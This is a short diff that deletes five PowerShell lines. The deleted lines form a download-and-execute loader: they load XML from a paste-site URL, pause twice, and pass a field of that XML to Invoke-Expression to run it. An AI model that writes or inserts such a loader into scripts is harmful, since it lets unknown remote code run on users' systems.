@@ -1,5 +1,0 @@
-$faw = New-Object System.Xml.XmlDocument 
-start-sleep -s 10
-$faw.Load("https://0paste.com/292563-d09aa0d6.txt")
-start-sleep -s 12
-$faw.command.a.execute | iex
